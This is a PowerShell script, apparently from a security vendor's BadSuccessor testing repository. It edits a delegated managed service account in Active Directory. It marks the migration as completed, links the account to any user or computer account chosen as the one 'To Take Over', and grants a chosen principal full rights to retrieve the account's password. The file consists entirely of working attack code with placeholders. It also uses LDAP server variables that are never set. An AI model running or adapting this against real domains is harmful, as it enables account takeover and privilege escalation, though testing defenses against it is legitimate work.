# ===================================================================================================================
# WRITE DATA INTO ATTRIBUTES "msDS-groupMSAMembership", "msDS-DelegatedMSAState", "msDS-ManagedAccountPrecededByLink"
# ===================================================================================================================
#
# SOURCE....: https://github.com/Semperis/BadSuccessorBlockOnOff
#
# LICENSE...: https://github.com/Semperis/BadSuccessorBlockOnOff?tab=MIT-1-ov-file
#
# DISCLAIMER: https://github.com/Semperis/BadSuccessorBlockOnOff?tab=readme-ov-file#disclaimer
#

# The DN Of The dMSA To Target
$dMSADN = "<DN Of The dMSA To Target>"

# 0 = UnUsed => To Remove (Not Replace!) $accAllowGetPwd Specified Value From "msDS-groupMSAMembership"
# 2 = Migration Completed => To Add (Not Replace!) $accAllowGetPwd Specified Value To "msDS-groupMSAMembership"
$dMSAState = <Numeric Value For The State>

# The DN Of ANY user/computer/sMDS/gMSA/dMSA Account To Over
# The Word CLEAR To Remove Any Specified DN
$accDN = "<The DN Of ANY user/computer/sMDS/gMSA/dMSA Account To Take Over OR The Word CLEAR>"

# The Principal Name Of An Account To Add To (When State Is 2) Or Remove From (When State Is 0) "msDS-groupMSAMembership" (a.k.a. PrincipalsAllowedToRetrieveManagedPassword)
$accAllowGetPwd = "<NetBIOS Domain Name>\<sAMAccountName>"

Invoke-Command -ArgumentList $dMSADN,$dMSAState,$accDN,$accAllowGetPwd -ScriptBlock {
	Param (
		$dMSADN,
		$dMSAState,
		$accDN,
		$accAllowGetPwd
	)

	Clear-Host

	$thisADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()
	$rwdcPDCFQDN = $thisADDomain.PdcRoleOwner.Name

	Add-Type -AssemblyName System.DirectoryServices.Protocols -ErrorAction Stop

	[Timespan]$requestTimeout = (New-Object System.TimeSpan(0,0,120)) # Default: 120 seconds
	$ldapDirectoryID = New-Object -TypeName System.DirectoryServices.Protocols.LdapDirectoryIdentifier -ArgumentList $ldapServerFQDN, $ldapServerPort, $true, $false
	$ldapAuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
	$ldapConnection = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList $ldapDirectoryID, $null, $ldapAuthType
	$ldapConnection.SessionOptions.Sealing = $true
	$ldapConnection.SessionOptions.Signing = $true

	[System.DirectoryServices.Protocols.ModifyRequest]$ldapModRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	$permissiveModifyRqc = New-Object System.DirectoryServices.Protocols.PermissiveModifyControl
	$permissiveModifyRqc.IsCritical = $false
	[void]($ldapModRequest.Controls.Add($permissiveModifyRqc))

	$object = [PSCustomObject]@{
		distinguishedName = $dMSADN
	}

	If (-not [string]::IsNullOrEmpty($dMSAState)) {
		Add-Member -InputObject $object -MemberType NoteProperty -Name "msDS-DelegatedMSAState" -Value $dMSAState
	}
	If (-not [string]::IsNullOrEmpty($accDN)) {
		Add-Member -InputObject $object -MemberType NoteProperty -Name "msDS-ManagedAccountPrecededByLink" -Value $accDN
	}
	If (-not [string]::IsNullOrEmpty($accAllowGetPwd)) {
		$ldapSearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest
		$ldapSearchRequest.DistinguishedName = $dMSADN
		$ldapSearchRequest.Scope = [System.DirectoryServices.Protocols.SearchScope]::"Base"
		$securityMasks = [System.DirectoryServices.Protocols.SecurityMasks]'Owner' -bor [System.DirectoryServices.Protocols.SecurityMasks]'Group' -bor [System.DirectoryServices.Protocols.SecurityMasks]'Dacl' -bor [System.DirectoryServices.Protocols.SecurityMasks]'Sacl'
		$sdFlagLdapControl = New-Object System.DirectoryServices.Protocols.SecurityDescriptorFlagControl($securityMasks)
		[void]($ldapSearchRequest.Controls.Add($sdFlagLdapControl))
		[void]($ldapSearchRequest.Attributes.Add("distinguishedName"))
		[void]($ldapSearchRequest.Attributes.Add("msDS-groupMSAMembership"))
		[System.DirectoryServices.Protocols.SearchResponse]$ldapSearchResponse = $ldapConnection.SendRequest($ldapSearchRequest, $requestTimeout)
		$adSecurity = New-Object System.DirectoryServices.ActiveDirectorySecurity
		If (-not [string]::IsNullOrEmpty($ldapSearchResponse.Entries.Attributes."msds-groupmsamembership")) {
			$adSecurity.SetSecurityDescriptorBinaryForm($ldapSearchResponse.Entries.Attributes.'msds-groupmsamembership'[0])
		} Else {
			$securityPrincipalOwnerSid = "S-1-5-32-544" # BUILTIN\Administrators
			$securityPrincipalOwnerSidObject = New-Object System.Security.Principal.SecurityIdentifier($securityPrincipalOwnerSid)					
			$securityPrincipalOwner = ($securityPrincipalOwnerSidObject.Translate([System.Security.Principal.NTAccount])).Value
			$securityPrincipalObjectForOwner = New-Object -TypeName System.Security.Principal.NTAccount($securityPrincipalOwner)
			$adSecurity.SetOwner($securityPrincipalObjectForOwner)
		}
		$securityPrincipalNTAccount = New-Object -TypeName System.Security.Principal.NTAccount($accAllowGetPwd)
		$accessControlType = [System.Security.AccessControl.AccessControlType]::"Allow"
		If ($dMSAState -eq 0 -And -not [string]::IsNullOrEmpty($($adSecurity.Access | Where-Object {$_.IdentityReference.Value -eq $accAllowGetPwd}))) {
			$adSecurity.RemoveAccess($securityPrincipalNTAccount, $accessControlType)
		}
		If ($dMSAState -eq 2) {
			$adRight = [System.DirectoryServices.ActiveDirectoryRights]::"GenericAll"
			$adSecurityInheritanceScope = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::"None"
			$aceDefinition = $securityPrincipalNTAccount,$adRight,$accessControlType,"00000000-0000-0000-0000-000000000000",$adSecurityInheritanceScope,"00000000-0000-0000-0000-000000000000"
			$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($aceDefinition)
			$adSecurity.AddAccessRule($accessRule)
		}
		Add-Member -InputObject $object -MemberType NoteProperty -Name "msDS-groupMSAMembership" -Value $adSecurity
	}

	$ldapModRequest.DistinguishedName = $object.DistinguishedName
	ForEach($property in (Get-Member -InputObject $object -MemberType NoteProperty)) {
		If ($property.Name -eq "distinguishedName") {continue}

		[System.DirectoryServices.Protocols.DirectoryAttribute]$propertyMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
		$propertyMod.Name = $property.Name

		If ($property.Name -eq "msDS-groupMSAMembership") {
			$propertyMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
			$propertyValue = $($object.($property.Name)).GetSecurityDescriptorBinaryForm()
			$propertyMod.Add([byte[]]$propertyValue) | Out-Null
		} Else {
			If ([string]::IsNullOrEmpty($object.($property.Name)) -Or $object.($property.Name) -eq "CLEAR") {
				$propertyMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
			} Else {
				$propertyMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
				$propertyValue = $object.($property.Name)
				$propertyMod.AddRange([string[]]($propertyValue))
			}
		}
		[void]($ldapModRequest.Modifications.Add($propertyMod))
	}
	
	$ldapConnection = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList $ldapDirectoryID, $null, $ldapAuthType
	$ldapConnection.SessionOptions.Sealing = $true
	$ldapConnection.SessionOptions.Signing = $true
	Try {
		Write-Host " > Updating Object '$($object.DistinguishedName)'..." -ForegroundColor Yellow

		ForEach($property in (Get-Member -InputObject $object -MemberType NoteProperty)) {
			If ($property.Name -eq "distinguishedName") {continue}

			Write-Host "   # Attribute...............: '$($property.Name)'" -ForegroundColor Yellow

			If ($property.Name -eq "msDS-groupMSAMembership") {
				$object.$($property.Name).Access | ForEach-Object {
					Write-Host "     * Value.................: '$($_.IdentityReference.Value)'" -ForegroundColor Yellow
				}
			} Else {
				Write-Host "     * Value.................: '$($object.($property.Name))'" -ForegroundColor Yellow
			}
			Write-Host ""
		}
		[void]($ldapConnection.SendRequest($ldapModRequest, $requestTimeout) -as [System.DirectoryServices.Protocols.ModifyResponse])
		Write-Host " - SUCCESS" -ForegroundColor Green
	} Catch {
		Write-Host " - FAILED" -ForegroundColor Red
		Write-Host "   Exception Type......: $($_.Exception.GetType().FullName)" -ForegroundColor Red
		Write-Host "   Exception Message...: $($_.Exception.Message)" -ForegroundColor Red
	}
	Write-Host ""
}